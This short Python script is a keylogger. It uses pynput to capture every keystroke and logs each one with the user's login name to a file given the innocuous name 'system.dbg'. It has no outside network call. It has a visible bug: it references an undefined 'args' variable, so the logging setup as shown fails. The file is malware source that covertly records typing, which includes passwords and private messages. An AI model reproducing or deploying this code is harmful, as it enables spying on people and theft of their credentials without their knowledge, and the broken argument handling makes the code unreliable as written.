from pynput.keyboard import Key, Listener
from os import getlogin
import logging
from sys import exit

save_file = "system.dbg"

try:
    logging.basicConfig(filename = (args.save), level=logging.DEBUG, format='%(asctime)s: %(message)s')
except FileNotFoundError:
    pass

def on_press(key):
   logging.info("[{}]: {}".format(getlogin(), str(key)))

with Listener(on_press=on_press) as listener:
    listener.join()